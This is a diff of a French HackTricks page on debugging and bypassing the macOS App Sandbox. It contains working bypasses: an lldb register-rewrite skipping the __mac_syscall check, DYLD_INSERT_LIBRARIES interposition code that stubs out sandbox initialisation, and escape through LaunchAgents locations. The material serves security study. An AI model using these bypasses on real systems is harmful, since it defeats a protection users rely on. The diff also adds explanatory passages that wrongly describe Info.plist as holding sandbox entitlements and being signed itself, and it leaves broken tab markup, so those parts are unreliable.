@@ -1,88 +1,83 @@
-# Débogage et contournement de la Sandbox macOS
+# Débogage et contournement du bac à sable macOS
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Processus de chargement de la Sandbox
+## Processus de chargement du bac à sable
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>Image de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Image de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-Dans l'image précédente, il est possible d'observer **comment la sandbox sera chargée** lorsqu'une application avec l'entitlement **`com.apple.security.app-sandbox`** est exécutée.
+Dans l'image précédente, il est possible d'observer **comment le bac à sable sera chargé** lorsqu'une application avec l'entitlement **`com.apple.security.app-sandbox`** est exécutée.
 
 Le compilateur liera `/usr/lib/libSystem.B.dylib` au binaire.
 
-Ensuite, **`libSystem.B`** appellera d'autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les entitlements de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur de la Sandbox, et si c'est le cas, il sera mis en quarantaine.\
-Enfin, la sandbox sera activée par un appel à **`__sandbox_ms`** qui appellera **`__mac_syscall`**.
+Ensuite, **`libSystem.B`** appellera plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les entitlements de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur du bac à sable, et le cas échéant, il sera mis en quarantaine.\
+Enfin, le bac à sable sera activé par un appel à **`__sandbox_ms`** qui appellera **`__mac_syscall`**.
 
 ## Possibles contournements
 
 {% hint style="warning" %}
-Notez que les **fichiers créés par des processus sandboxés** sont dotés de l'**attribut de quarantaine** pour empêcher les évasions de la Sandbox.
+Notez que les **fichiers créés par des processus en bac à sable** se voient attribuer l'**attribut de quarantaine** pour empêcher les évasions du bac à sable.
 {% endhint %}
 
-### Exécuter un binaire sans Sandbox
+### Exécuter un binaire sans bac à sable
 
-Si vous exécutez un binaire qui ne sera pas sandboxé à partir d'un binaire sandboxé, il **s'exécutera dans la Sandbox du processus parent**.
+Si vous exécutez un binaire qui ne sera pas mis en bac à sable à partir d'un binaire mis en bac à sable, il **s'exécutera dans le bac à sable du processus parent**.
 
-### Débogage et contournement de la Sandbox avec lldb
+### Déboguer et contourner le bac à sable avec lldb
 
-Compilons une application qui devrait être sandboxée :
+Compilons une application qui devrait être mise en bac à sable :
 
 {% tabs %}
 {% tab title="sand.c" %}
 ```c
 #include <stdlib.h>
 int main() {
-    system("cat ~/Desktop/del.txt");
+system("cat ~/Desktop/del.txt");
 }
 ```
+{% tab title="entitlements.xml" %}
+
+Le fichier `entitlements.xml` contient les autorisations spécifiques accordées à une application macOS pour accéder à certaines fonctionnalités ou ressources du système. Ces autorisations sont définies à l'aide de clés et de valeurs spécifiques dans le fichier XML.
+
+Voici un exemple de fichier `entitlements.xml` :
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>com.apple.security.app-sandbox</key>
+    <true/>
+    <key>com.apple.security.files.user-selected.read-write</key>
+    <true/>
+    <key>com.apple.security.network.client</key>
+    <true/>
+    <key>com.apple.security.print</key>
+    <true/>
+</dict>
+</plist>
+```
+
+Dans cet exemple, l'application a les autorisations suivantes :
+
+- `com.apple.security.app-sandbox` : autorise l'application à s'exécuter dans un bac à sable.
+- `com.apple.security.files.user-selected.read-write` : autorise l'application à lire et écrire des fichiers sélectionnés par l'utilisateur.
+- `com.apple.security.network.client` : autorise l'application à accéder au réseau.
+- `com.apple.security.print` : autorise l'application à imprimer.
+
+Ces autorisations peuvent être utilisées pour restreindre les actions qu'une application peut effectuer et renforcer la sécurité du système macOS.
+
 {% endtab %}
-
-{% tab title="README.md" %}
-# macOS Sandbox Debug and Bypass
-
-The macOS sandbox is a powerful security feature that restricts the actions that a process can perform on a system. However, like any security feature, it is not perfect and can be bypassed or debugged in certain circumstances.
-
-This directory contains examples of techniques that can be used to bypass or debug the macOS sandbox.
-
-## Debugging the Sandbox
-
-Debugging the macOS sandbox can be useful for understanding how it works and for finding vulnerabilities that can be exploited to bypass it. There are several tools and techniques that can be used to debug the sandbox, including:
-
-- **lldb**: The LLDB debugger can be used to attach to a sandboxed process and inspect its state. This can be useful for understanding how the sandbox is enforced and for finding vulnerabilities that can be exploited to bypass it.
-
-- **dtrace**: The DTrace dynamic tracing framework can be used to trace the system calls made by a sandboxed process. This can be useful for understanding how the sandbox is enforced and for finding vulnerabilities that can be exploited to bypass it.
-
-- **sysdiagnose**: The sysdiagnose tool can be used to collect diagnostic information about a sandboxed process. This can be useful for understanding how the sandbox is enforced and for finding vulnerabilities that can be exploited to bypass it.
-
-## Bypassing the Sandbox
-
-Bypassing the macOS sandbox can be useful for performing actions that are restricted by the sandbox, such as accessing sensitive files or performing network operations. There are several techniques that can be used to bypass the sandbox, including:
-
-- **Exploiting vulnerabilities**: Like any software, the macOS sandbox is not perfect and can contain vulnerabilities that can be exploited to bypass it. Finding and exploiting these vulnerabilities can be a powerful way to bypass the sandbox.
-
-- **Abusing entitlements**: Entitlements are a way for macOS applications to request additional privileges beyond what is normally allowed by the sandbox. By abusing entitlements, it is possible to bypass the sandbox and perform actions that are normally restricted.
-
-- **Using third-party libraries**: Third-party libraries can be used to bypass the sandbox by performing actions that are normally restricted. For example, a library might provide a way to access sensitive files or perform network operations that are normally restricted by the sandbox.
-
-- **Modifying the sandbox profile**: The sandbox profile is a configuration file that defines the restrictions placed on a sandboxed process. By modifying the sandbox profile, it is possible to bypass the sandbox and perform actions that are normally restricted.
-
-## References
-
-- [Apple Developer Documentation: macOS Security](https://developer.apple.com/documentation/security/mac_security)
-- [Apple Developer Documentation: macOS Sandboxing](https://developer.apple.com/documentation/security/app_sandboxing)
-- [Apple Developer Documentation: macOS Entitlements](https://developer.apple.com/documentation/security/entitlements)
-- [Apple Developer Documentation: macOS Code Signing](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html)
-- [Apple Developer Documentation: macOS System Integrity Protection](https://developer.apple.com/documentation/security/system_integrity_protection)
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -91,50 +86,22 @@ Bypassing the macOS sandbox can be useful for performing actions that are restri
 </dict>
 </plist>
 ```
-{% endtab %}
-
 {% tab title="Info.plist" %}
 
-# macOS Sandbox Debug and Bypass
+Le fichier Info.plist est un fichier de configuration utilisé par les applications macOS pour définir leurs paramètres et comportements. Il contient des informations telles que le nom de l'application, son identifiant de bundle, les autorisations requises, les services système utilisés, etc. Ce fichier est essentiel pour le bon fonctionnement de l'application et est généralement situé dans le bundle de l'application.
 
-The macOS sandbox is a powerful security feature that restricts the actions that a process can perform on a system. It is used to enforce security policies and prevent malicious code from executing on a system. However, the sandbox is not foolproof and can be bypassed by attackers who have the knowledge and skills to do so.
+Dans le contexte du sandboxing, le fichier Info.plist est utilisé pour déclarer les autorisations nécessaires à l'application pour accéder à certaines ressources système. Ces autorisations sont définies à l'aide de clés spécifiques dans le fichier Info.plist. Par exemple, l'autorisation d'accéder au réseau peut être déclarée en utilisant la clé "com.apple.security.network.client".
 
-This guide will cover some of the techniques that can be used to debug and bypass the macOS sandbox.
+Il est important de noter que le fichier Info.plist est signé numériquement pour garantir son intégrité et empêcher toute modification non autorisée. La signature numérique est vérifiée par le système d'exploitation lors du lancement de l'application.
 
-## Debugging the macOS Sandbox
-
-Debugging the macOS sandbox can be a useful technique for understanding how it works and identifying potential vulnerabilities. There are several tools that can be used to debug the sandbox, including:
-
-- **sandbox-exec**: This is a command-line tool that can be used to run a process in a sandbox and monitor its behavior. It can be used to identify sandbox violations and other issues.
-
-- **lldb**: This is a debugger that can be used to attach to a process and debug it. It can be used to identify sandbox violations and other issues.
-
-- **dtrace**: This is a dynamic tracing tool that can be used to monitor system activity. It can be used to identify sandbox violations and other issues.
-
-## Bypassing the macOS Sandbox
-
-Bypassing the macOS sandbox can be a difficult task, but it is not impossible. There are several techniques that can be used to bypass the sandbox, including:
-
-- **Exploiting sandbox vulnerabilities**: The sandbox is not perfect and can contain vulnerabilities that can be exploited to bypass it. These vulnerabilities can be found by analyzing the sandbox code or by fuzzing the sandbox.
-
-- **Exploiting kernel vulnerabilities**: The sandbox relies on the kernel to enforce its policies. If there are vulnerabilities in the kernel, they can be exploited to bypass the sandbox.
-
-- **Exploiting third-party applications**: Third-party applications that are not sandboxed can be exploited to bypass the sandbox. For example, an attacker could exploit a vulnerability in a web browser to execute code outside of the sandbox.
-
-- **Exploiting configuration issues**: The sandbox relies on configuration files to enforce its policies. If there are configuration issues, they can be exploited to bypass the sandbox.
-
-## Conclusion
-
-The macOS sandbox is a powerful security feature that can help prevent malicious code from executing on a system. However, it is not foolproof and can be bypassed by attackers who have the knowledge and skills to do so. By understanding how the sandbox works and the techniques that can be used to bypass it, you can better protect your system from attacks.
-
-{% endtab %}
+Lors de l'analyse d'une application macOS, il est essentiel de vérifier le contenu du fichier Info.plist pour comprendre les autorisations demandées par l'application et évaluer les risques potentiels liés à ces autorisations.
 ```xml
 <plist version="1.0">
 <dict>
-    <key>CFBundleIdentifier</key>
-    <string>xyz.hacktricks.sandbox</string>
-    <key>CFBundleName</key>
-    <string>Sandbox</string>
+<key>CFBundleIdentifier</key>
+<string>xyz.hacktricks.sandbox</string>
+<key>CFBundleName</key>
+<string>Sandbox</string>
 </dict>
 </plist>
 ```
@@ -156,8 +123,8 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-L'application va essayer de **lire** le fichier **`~/Desktop/del.txt`**, que le **bac à sable n'autorisera pas**.\
-Créez un fichier là-bas car une fois que le bac à sable est contourné, il pourra le lire :
+L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, que le **Sandbox n'autorisera pas**.\
+Créez un fichier là-bas car une fois que le Sandbox est contourné, il pourra le lire :
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
@@ -179,11 +146,11 @@ lldb ./sand
 # We are looking for the one libsecinit from libSystem.B, like the following one:
 (lldb) bt
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
-    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
-    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
-    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
-    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
+* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
+frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
+frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
+frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
+frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
 
 # To avoid lldb cutting info
 (lldb) settings set target.max-string-summary-length 10000
@@ -194,8 +161,8 @@ lldb ./sand
 
 # The 3 arg is the address were the XPC response will be stored
 (lldb) register read x2
-  x2 = 0x000000016fdfd660
-  
+x2 = 0x000000016fdfd660
+
 # Move until the end of the function
 (lldb) finish
 
@@ -222,37 +189,36 @@ lldb ./sand
 # Due to the previous bp, the process will be stopped in:
 Process 2517 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
+frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
 libsystem_kernel.dylib`:
 ->  0x187659900 <+0>:  mov    x16, #0x17d
-    0x187659904 <+4>:  svc    #0x80
-    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
-    0x18765990c <+12>: pacibsp
-
-# To bypass jump to the b.lo address modifying some registers first
-(lldb) breakpoint delete 1 # Remove bp
-(lldb) register write $pc 0x187659928 #b.lo address
+0x187659904 <+4>:  svc    #0x80
+0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
+0x18765990c <+12>: pacibsp
+# Pour contourner, sautez à l'adresse b.lo en modifiant d'abord certains registres
+(lldb) breakpoint delete 1 # Supprimer le point d'arrêt
+(lldb) register write $pc 0x187659928 # Adresse b.lo
 (lldb) register write $x0 0x00
 (lldb) register write $x1 0x00
 (lldb) register write $x16 0x17d
 (lldb) c
-Process 2517 resuming
-Sandbox Bypassed!
-Process 2517 exited with status = 0 (0x00000000)
+Processus 2517 en cours de reprise
+Contournement du bac à sable réussi !
+Le processus 2517 s'est terminé avec le statut = 0 (0x00000000)
 ```
 {% hint style="warning" %}
-Même si le Sandbox est contourné, TCC demandera à l'utilisateur s'il veut autoriser le processus à lire les fichiers du bureau.
+**Même si le Sandbox est contourné, TCC** demandera à l'utilisateur s'il souhaite autoriser le processus à lire les fichiers du bureau.
 {% endhint %}
 
 ### Abus d'autres processus
 
-Si vous êtes capable de **compromettre d'autres processus** fonctionnant dans des Sandboxes moins restrictives (ou sans Sandboxes), vous pourrez vous échapper vers leurs Sandboxes :
+Si à partir du processus Sandbox, vous parvenez à **compromettre d'autres processus** s'exécutant dans des sandboxes moins restrictives (ou aucune), vous pourrez échapper à leurs sandboxes :
 
 {% content-ref url="../../../macos-proces-abuse/" %}
 [macos-proces-abuse](../../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-### Contournement d'interposition
+### Contournement de l'interposition
 
 Pour plus d'informations sur l'**interposition**, consultez :
 
@@ -260,7 +226,7 @@ Pour plus d'informations sur l'**interposition**, consultez :
 [macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
 {% endcontent-ref %}
 
-#### Interposer `_libsecinit_initializer` pour éviter le Sandbox
+#### Interposer `_libsecinit_initializer` pour empêcher le sandbox
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -269,12 +235,12 @@ Pour plus d'informations sur l'**interposition**, consultez :
 void _libsecinit_initializer(void);
 
 void overriden__libsecinit_initializer(void) {
-    printf("_libsecinit_initializer called\n");
+printf("_libsecinit_initializer called\n");
 }
 
 __attribute__((used, section("__DATA,__interpose"))) static struct {
-	void (*overriden__libsecinit_initializer)(void);
-	void (*_libsecinit_initializer)(void);
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
 }
 _libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
 ```
@@ -284,7 +250,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-#### Interposer `__mac_syscall` pour empêcher le Sandbox
+#### Interposer `__mac_syscall` pour contourner le Sandbox
 
 {% code title="interpose.c" %}
 ```c
@@ -298,27 +264,27 @@ int __mac_syscall(const char *_policyname, int _call, void *_arg);
 
 // Replacement function
 int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-        printf("Bypassing Sandbox initiation.\n");
-        return 0; // pretend we did the job without actually calling __mac_syscall
-    }
-    // Call the original function for other cases
-    return __mac_syscall(_policyname, _call, _arg);
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
 }
 
 // Interpose Definition
 struct interpose_sym {
-    const void *replacement;
-    const void *original;
+const void *replacement;
+const void *original;
 };
 
 // Interpose __mac_syscall with my_mac_syscall
 __attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
 };
 ```
-{% endcode %} (This is not a text to be translated, it's a markdown tag indicating the end of a code block)
+{% endcode %}
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -332,23 +298,23 @@ Sandbox Bypassed!
 ```
 ### Compilation statique et liaison dynamique
 
-[Cette recherche](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert deux façons de contourner le bac à sable. Étant donné que le bac à sable est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais mis en bac à sable :
+[**Cette recherche**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de contourner le bac à sable. Étant donné que le bac à sable est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais mis en bac à sable :
 
 * Si le binaire était **complètement compilé de manière statique**, il pourrait éviter de charger cette bibliothèque.
-* Si le **binaire n'avait pas besoin de charger de bibliothèques** (car le lien est également dans libSystem), il n'aurait pas besoin de charger libSystem.
+* Si le **binaire n'avait pas besoin de charger de bibliothèques** (car le lien est également dans libSystem), il n'aurait pas besoin de charger libSystem.&#x20;
 
 ### Shellcodes
 
-Notez que **même les shellcodes** en ARM64 doivent être liés dans `libSystem.dylib`:
+Notez que **même les shellcodes** en ARM64 doivent être liés à `libSystem.dylib`:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
 ### Abus des emplacements de démarrage automatique
 
-Si un processus sandboxé peut **écrire** dans un endroit où **plus tard une application non sandboxée va exécuter le binaire**, il pourra **s'échapper simplement en y plaçant** le binaire. Un bon exemple de ce type d'emplacements sont `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
+Si un processus en bac à sable peut **écrire** dans un emplacement où **ultérieurement une application non en bac à sable va exécuter le binaire**, il pourra **s'échapper simplement en y plaçant** le binaire. Un bon exemple de ce type d'emplacements sont `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
 
-Pour cela, vous pourriez même avoir besoin de **2 étapes** : faire fonctionner un processus avec un **bac à sable plus permissif** (`file-read*`, `file-write*`) exécuter votre code qui écrira effectivement dans un endroit où il sera **exécuté sans bac à sable**.
+Pour cela, vous pourriez même avoir besoin de **2 étapes** : Faire en sorte qu'un processus avec un **bac à sable plus permissif** (`file-read*`, `file-write*`) exécute votre code qui écrira effectivement dans un emplacement où il sera **exécuté sans bac à sable**.
 
 Consultez cette page sur les **emplacements de démarrage automatique** :
 
@@ -369,7 +335,7 @@ Consultez cette page sur les **emplacements de démarrage automatique** :
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
